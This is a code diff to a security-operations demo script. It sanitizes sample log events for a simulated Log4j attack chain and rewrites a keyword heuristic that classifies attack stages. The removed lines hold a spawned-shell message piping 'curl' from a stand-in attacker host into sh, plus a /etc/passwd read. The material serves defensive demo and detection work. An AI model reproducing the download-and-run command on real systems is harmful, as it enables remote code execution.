@@ -38,29 +38,30 @@ DEMO_SERVICES = [
 ]
 
 # Sample events for demo when no BOTS data available
+# Sanitized: no actual payloads, consistent with api.py demo events
 DEMO_EVENTS = [
     {"ts": "2024-01-15T10:01:00Z", "source": "bots", "event_type": "web", "host": "web-srv-01",
      "src_ip": "203.0.113.50", "dst_ip": "10.0.1.20", "severity": "high",
      "message": "GET /api/search?q=[log4j-jndi-pattern:redacted] HTTP/1.1 200", "fields": {}},
     {"ts": "2024-01-15T10:01:01Z", "source": "bots", "event_type": "dns", "host": "web-srv-01",
-     "src_ip": "10.0.1.20", "message": "DNS query: evil.attacker.com -> 198.51.100.10", "fields": {}},
+     "src_ip": "10.0.1.20", "message": "DNS query: suspicious-domain.com -> 198.51.100.10", "fields": {}},
     {"ts": "2024-01-15T10:01:02Z", "source": "bots", "event_type": "alert", "host": "web-srv-01",
      "src_ip": "10.0.1.20", "dst_ip": "198.51.100.10", "severity": "critical",
      "message": "IDS Alert: Outbound LDAP to suspicious IP 198.51.100.10:1389", "fields": {}},
     {"ts": "2024-01-15T10:01:03Z", "source": "bots", "event_type": "process", "host": "web-srv-01",
-     "severity": "critical", "message": "Java process loaded remote class: Exploit.class from 198.51.100.10", "fields": {}},
+     "severity": "critical", "message": "Java process loaded remote class from 198.51.100.10", "fields": {}},
     {"ts": "2024-01-15T10:01:04Z", "source": "bots", "event_type": "process", "host": "web-srv-01",
      "user": "www-data", "severity": "critical",
-     "message": "Process spawned: /bin/sh -c 'curl http://evil.attacker.com/shell.sh | sh'", "fields": {}},
+     "message": "Process spawned: shell command execution detected", "fields": {}},
     {"ts": "2024-01-15T10:01:05Z", "source": "bots", "event_type": "alert", "host": "web-srv-01",
      "src_ip": "10.0.1.20", "dst_ip": "198.51.100.10", "severity": "high",
-     "message": "Netflow: Large outbound transfer 10.0.1.20 -> 198.51.100.10:443 (15KB)", "fields": {}},
+     "message": "Netflow: Large outbound transfer detected (15KB)", "fields": {}},
     {"ts": "2024-01-15T10:01:10Z", "source": "bots", "event_type": "file", "host": "web-srv-01",
      "user": "www-data", "severity": "high",
-     "message": "File access: /etc/passwd read by process sh (pid 12345)", "fields": {}},
+     "message": "Sensitive file access: /etc/passwd", "fields": {}},
     {"ts": "2024-01-15T10:01:15Z", "source": "bots", "event_type": "auth", "host": "web-srv-01",
      "user": "www-data", "severity": "critical",
-     "message": "Privilege escalation attempt: www-data tried sudo to root", "fields": {}},
+     "message": "Privilege escalation attempt detected", "fields": {}},
 ]
 
 
@@ -321,6 +322,55 @@ def run_soc_demo(bots_path: str = None, events_path: str = None, rate: int = 200
     print(f"      Wrote {bench_path}")
     print()
 
+    # Red stage heuristic - matches stage-locked data from gen_wargame_data.py
+    # Moved outside build_ui_state so it can be called independently
+    def detect_stage(evts):
+        types = " ".join([str(getattr(x, 'event_type', x.get('event_type') if isinstance(x, dict) else '')) for x in evts]).lower()
+        msgs = " ".join([str(getattr(x, 'message', x.get('message') if isinstance(x, dict) else '')) for x in evts]).lower()
+
+        # Check for blocked indicator first
+        if 'blocked' in msgs or 'egress blocked' in msgs:
+            return 'blocked'
+
+        # Stage detection based on attack chain phases
+        # Stage 7: auth anomalies / lateral movement
+        if 'auth' in types or 'auth fail' in msgs or 'auth success' in msgs or 'privilege' in msgs or 'sudo' in msgs:
+            return 'lateral_auth'
+
+        # Stage 6: exfil spike (large bytes_out)
+        if 'bytes_out=' in msgs:
+            # Check for large transfers (exfil indicator)
+            import re
+            bytes_matches = re.findall(r'bytes_out=(\d+)', msgs)
+            if any(int(b) > 100000 for b in bytes_matches):
+                return 'exfil_suspected'
+
+        # Stage 5: sensitive file access
+        if 'file_read' in msgs or 'sensitive' in msgs or 'sensitive:redacted' in msgs:
+            return 'file_access'
+
+        # Stage 4: EDR anomalies (process + net)
+        if 'edr' in types or 'child' in msgs or 'process_start' in msgs or 'net_connect' in msgs:
+            return 'edr_anomaly'
+
+        # Stage 3: LDAP egress
+        if 'ldap' in msgs or 'outbound ldap' in msgs or ':389' in msgs:
+            return 'ldap_egress'
+
+        # Stage 2: DNS callbacks
+        if 'dns' in types or 'unusual domain' in msgs or 'callback' in msgs:
+            return 'dns_callbacks'
+
+        # Stage 1: Web indicator
+        if 'log4j' in msgs or 'jndi' in msgs or 'indicator:redacted' in msgs:
+            return 'web_indicator'
+
+        # No attack indicators found - incomplete analysis
+        if not evts:
+            return 'incomplete'
+
+        return 'complete'
+
     # Write ui_state periodically / at end so frontend can read a single source of truth
     def build_ui_state(status="running"):
         # Basic metrics
@@ -342,22 +392,6 @@ def run_soc_demo(bots_path: str = None, events_path: str = None, rate: int = 200
                 "msg": getattr(e, 'message', e.get('message') if isinstance(e, dict) else ''),
                 "sev": getattr(e, 'severity', e.get('severity') if isinstance(e, dict) else 'low')
             })
-
-        # Red stage heuristic
-        def detect_stage(evts):
-            types = " ".join([str(getattr(x, 'event_type', x.get('event_type') if isinstance(x, dict) else '')) for x in evts])
-            msgs = " ".join([str(getattr(x, 'message', x.get('message') if isinstance(x, dict) else '')) for x in evts])
-            if 'ldap' in msgs or 'LDAP' in msgs or 'ldap' in types:
-                return 'ldap_egress'
-            if 'dns' in types or 'DNS' in msgs:
-                return 'dns_callbacks'
-            if 'EDR' in msgs or 'child' in msgs or 'process' in types:
-                return 'edr_anomaly'
-            if 'outbound' in msgs or 'transfer' in msgs or 'bytes' in msgs:
-                return 'exfil_suspected'
-            if 'auth' in types or 'privilege' in msgs or 'sudo' in msgs:
-                return 'lateral_auth'
-            return 'complete'
 
         red = {
             "stage": detect_stage(events),
@@ -423,13 +457,25 @@ def run_soc_demo(bots_path: str = None, events_path: str = None, rate: int = 200
 
         return ui
 
-    # write final ui_state atomically (status=complete) and include result
+    # write final ui_state atomically (status=done) and include result
     ui_state_path = artifacts_dir / "ui_state.json"
     try:
-        result_status = "success"
-        if not case or not getattr(case, 'evidence', None):
-            result_status = "inconclusive"
-        final_ui = build_ui_state(status="complete")
+        # Determine result based on detected stage
+        detected_stage = detect_stage(events)
+
+        # Explicit result classification based on attack chain stage
+        if detected_stage == 'blocked':
+            result_status = 'blocked'
+        elif detected_stage in ('exfil_suspected', 'lateral_auth'):
+            result_status = 'success'  # Full attack chain detected
+        elif detected_stage in ('incomplete', 'web_indicator', 'dns_callbacks'):
+            result_status = 'inconclusive'  # Insufficient evidence
+        elif not case or not getattr(case, 'evidence', None):
+            result_status = 'inconclusive'
+        else:
+            result_status = 'success'
+
+        final_ui = build_ui_state(status="done")  # Changed from "complete" to "done" for frontend
         final_ui["result"] = result_status
         tmp_path = ui_state_path.with_suffix('.tmp')
         with open(tmp_path, 'w', encoding='utf-8') as f:
